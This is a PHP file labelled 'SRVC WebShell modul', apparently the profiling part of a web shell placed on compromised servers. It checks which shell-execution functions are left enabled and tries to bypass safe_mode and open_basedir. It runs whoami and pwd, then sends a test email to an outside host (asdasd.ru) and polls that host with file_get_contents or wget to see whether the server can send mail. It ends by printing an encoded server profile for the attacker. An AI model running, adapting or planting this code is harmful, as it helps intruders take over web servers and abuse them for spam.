/* SRVC WebShell modul */
@ini_set('display_errors',0); 
@ini_set('log_errors',0); 
@error_reporting(0); 



function srvcshell_function_enabled($func) {
 $disabled=explode(",",@ini_get("disable_functions")); 
 if (empty($disabled)) { 
  $disabled=array(); 
 } 
 else {  
  $disabled=array_map('trim',array_map('strtolower',$disabled)); 
 } 
 return (function_exists($func) && is_callable($func) && !in_array($func,$disabled) );                                                                          
}
if (!srvcshell_function_enabled('shell_exec') and !srvcshell_function_enabled('proc_open') and !srvcshell_function_enabled('passthru') and !srvcshell_function_enabled('system') and !srvcshell_function_enabled('exec') and !srvcshell_function_enabled('popen')) {
 $failflag="1";
} else {
 $failflag="0";
}
if(srvcshell_function_enabled("ini_get")) {                                               
 function my_ini_get($option) {
  return ini_get($option);
 }
} elseif(srvcshell_function_enabled("ini_get_all")) {
 function my_ini_get($option) {
  $array = ini_get_all();
  return $array[$option]["local_value"];
 }
} elseif(srvcshell_function_enabled("get_cfg_var")) {
 function my_ini_get($option) {
  return get_cfg_var($option);
 }
} else {
 function my_ini_get($option) {
  return NULL;
 }
}
function version() {
 $pv=explode(".",phpversion());
 if(preg_match("/\-/",$pv[2])) { 
  $tmp=explode("-",$pv[2]);
  $pv[2]=$tmp[0];
 }
 $php_version_sort=$pv[0].".".$pv[1].".".$pv[2];
 return $php_version_sort;
}
function shellsrvc_run($c) {
 if (srvcshell_function_enabled('shell_exec')) {
  $out=shell_exec($c);
  return $out; #TODO: debug
 } else if(srvcshell_function_enabled('system')) {
  system($c);
 } else if(srvcshell_function_enabled('passthru')) {
  passthru($c);
 } else if(srvcshell_function_enabled('exec')) {
  exec($c);
 } else if(srvcshell_function_enabled('popen')) {
  $fp=popen($c,'r');
  @pclose($fp);
 } else if(srvcshell_function_enabled('proc_open')) {
  $handle=proc_open($c,$GLOBALS["descriptorspec"],$pipes);
  while (!feof($pipes[1])) {
   $buffer.=fread($pipes[1],1024);
  }
  @proc_close($handle);
 }
}
function shellsrvc_random_hash($length = 6) { 
 $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
 $result = "";
 for ($p = 0; $p < $length; $p++) {
  $result .= ($p%2) ? $chars[mt_rand(19, 23)] : $chars[mt_rand(0, 18)];
 }
 return md5($result."".time());
}



 $server_info = array();
 $uname=PHP_OS;
 if(empty($uname)) {
  if (srvcshell_function_enabled('getenv')) {
   $uname = getenv('OS'); 
  } else {
   $uname=shellsrvc_run('uname -s');
  }
 }
 if (!empty($uname)) {
  $server_info["os"]=$uname;
 } else {
  $server_info["os"]="";
 }
 
 if (srvcshell_function_enabled('php_uname')) {
  $server_info["osversion"]=php_uname();
 }
 if (srvcshell_function_enabled('posix_uname')) {
  $server_info["osversion"]="";
  foreach(posix_uname() AS $key=>$value) {
   $server_info["osversion"] .= " ".$value;
  }
 }
 
 $server_info["webserver"]=$_SERVER["SERVER_SOFTWARE"];

 if (my_ini_get("safe_mode") =="1" || my_ini_get("safe_mode") ==1 || my_ini_get("safe_mode") == TRUE) {
  @ini_restore("safe_mode");
  if (my_ini_get("safe_mode") =="1" || my_ini_get("safe_mode") ==1 || my_ini_get("safe_mode") == TRUE) {
   @ini_set("safe_mode", FALSE);
   @ini_set("safe_mode", 0);
   @ini_set("safe_mode", "0");
   if (my_ini_get("safe_mode") =="1" || my_ini_get("safe_mode") ==1 || my_ini_get("safe_mode") == TRUE) {
    $server_info["safemode"]=1;
   } else {
    $server_info["safemode"]=1;
   }
  } else {
   $server_info["safemode"]=1;
  }
 } else {
  $server_info["safemode"]=0;
 }

 if (srvcshell_function_enabled('posix_getuid')) {
  if (srvcshell_function_enabled('posix_getpwuid')) {
   $processUser = posix_getpwuid(posix_getuid());
   $server_info["uid"]=$processUser['name'];
  } else {
   $server_info["uid"]="";
  }
 }
 if (srvcshell_function_enabled('posix_geteuid')) {
  if (srvcshell_function_enabled('posix_getpwuid')) {
   $processUser = posix_getpwuid(posix_getuid());
   $server_info["uid"]=$processUser['name'];
  } else {
   $server_info["uid"]="";
  }
 }
 
 $server_info["disable_functions"]=my_ini_get('disable_functions');
 
 if (@extension_loaded('curl')) {
  if (srvcshell_function_enabled('curl_setopt')) {
   $server_info["curl"]=1;
  } else {
   $server_info["curl"]=0;
  }
 } else {
  $server_info["curl"]=0;
 }
 
 $server_info["php_api"]=php_sapi_name();
 
 $server_info["php_version"]=phpversion();
 
 if (my_ini_get("open_basedir")==0 || my_ini_get("open_basedir")=="/" || my_ini_get("open_basedir")==NULL || strtolower(my_ini_get("open_basedir"))=="none") {
  $server_info["basedir"]="none";
 } 
 else {
  @ini_restore("open_basedir");
  if (my_ini_get("open_basedir")==0 || my_ini_get("open_basedir")=="/" || my_ini_get("open_basedir")==NULL || strtolower(my_ini_get("open_basedir"))=="none") {
   $server_info["basedir"]=1;
  } 
  else {
   @ini_set('open_basedir', '/'); 
   if (my_ini_get("open_basedir")=="/") {
    $server_info["basedir"]=1;
   } 
   else {
    $server_info["basedir"]=my_ini_get("open_basedir");
   }
  }
 } 

 if (!@set_time_limit(0)) {
  if (srvcshell_function_enabled('ini_set')) {
   @ini_set('max_execution_time',0);
  } elseif (srvcshell_function_enabled('ini_alter')) {
   @ini_alter('max_execution_time',0);
  }
  if (my_ini_get('max_execution_time')!='0') {
   $server_info["timelimit"]=my_ini_get("max_execution_time");
  } else {
   $server_info["timelimit"]=1; 
  }
 } else { 
  $server_info["timelimit"]=1; 
 }

 if (ignore_user_abort() == 1) {
  $server_info["userabort"]=1;
 } else {
  @ignore_user_abort(1);
  if (ignore_user_abort() == 1) {
   $server_info["userabort"]=1;
  } else {
   $server_info["userabort"]=0;
  }
 }

 if (srvcshell_function_enabled('fsockopen')) {
  $fp=fsockopen('www.google.com',80,$errno,$erstr,4);
  if (is_resource($fp)) {
   fwrite($fp,'GET http://www.google.com/ HTTP/1.0'."\r\n".'Host: www.google.com'."\r\n".'Connection: Close'."\r\n\r\n");
   $zc=0;
   $data="";
   while (!feof($fp)) {
    $data.=fgets($fp,2048);
    if (($zc++)>200) break;
   }
   unset($zc);
   fclose($fp);
   if(strpos($data,'Set-Cookie')) {
    $server_info["socket"]=1;
   } else {
    $server_info["socket"]=0;
   }
  } else {
   $server_info["socket"]=0;
  }
 }

 $lol="1";$lol2="2";
 eval('$lol=12345;$lol2="huipizdadjigurda".$lol;');
 if ($lol2 == "huipizdadjigurda12345") {
  $server_info["is_evalable"]=1;
 } else {
  $server_info["is_evalable"]=0;
 }

 $pwd=shellsrvc_run("pwd");
 if (!empty($pwd)) { 
  $server_info["is_execable"]=1; 
 } else {
  $server_info["is_execable"]=0;
 }

# if ($_REQUEST["sendmail"] == "1") {
  $check_mail=true;
# }

 if ($check_mail) { 
  $subject=shellsrvc_random_hash(4);
  $recipient=shellsrvc_random_hash(4);
  if ($failflag != "1") {
   $whoami=shellsrvc_run("whoami");
  } else {
   if (srvcshell_function_enabled("get_current_user")) {
    $whoami=get_current_user();
   } else {
    $whoami="webmaster";
   }
  }
  $hostname=trim($_SERVER["HTTP_HOST"]);
  if(preg_match('/^localhost$/', $hostname) || preg_match('/^127.0.0.1$/', $hostname)) {
   $server_info["is_mailable"]="no";
   $server_info["sendmail_cmd"]="-";
  } else {
   if (srvcshell_function_enabled('mail')) {
    //echo "mail() enabled";
    $server_info["is_mailable"]="unknown";
    $server_info["sendmail_cmd"]="[PHP] mail();";
    if ($_REQUEST["checkmail"] == "1") {
     $server_info["is_mailable"]="";
     $server_info["sendmail_cmd"]="-";
     //echo ", sending message with mail():";
     if (mail($recipient."@asdasd.ru", $subject, "test message ololo 123", 
     "From: ".$whoami."@".$hostname."\r\n" 
     ."X-Mailer: PHP/" . phpversion())) {
      if (my_ini_get("allow_url_fopen") == "1" && srvcshell_function_enabled("file_get_contents")) {
       sleep(8);
       $pagecontents=file_get_contents("http://asdasd.ru?u=".$recipient);
       if(preg_match('/'.$subject.'/', $pagecontents)) {
        $server_info["is_mailable"]="yes";
        $server_info["sendmail_cmd"]="[PHP] mail();";
       } else { 
        $server_info["is_mailable"]="no";
        $server_info["sendmail_cmd"]="-";
       }
      } else {
       if ($failflag != "1") {
        $check=trim(shellsrvc_run('if `wget -O- http://asdasd.ru/?u='.$recipient.' >&1 2>&1| grep -q '.$subject.' 2>/dev/null`; then echo OK; else echo FAIL; fi'));
        if ($check == "OK") {
         $server_info["is_mailable"]="yes";
         $server_info["sendmail_cmd"]="[PHP] mail();";
        } else { 
         $server_info["is_mailable"]="no";
         $server_info["sendmail_cmd"]="-";
        }
        #TODO: check via fetch, curl, ...
       }
      }
     } else {
      //echo "error!";
      $server_info["is_mailable"]="no";
      $server_info["sendmail_cmd"]="-";
     }
    }
   } else {
    if ($failflag != "1") {
     #TODO: system mail
    } else {
     $server_info["is_mailable"]="no";
     $server_info["sendmail_cmd"]="-";
    }
   }
  }  
 } else {
  $server_info["is_mailable"]="unknown";
  $server_info["sendmail_cmd"]="-";
 }
 
echo base64_encode(serialize($server_info));



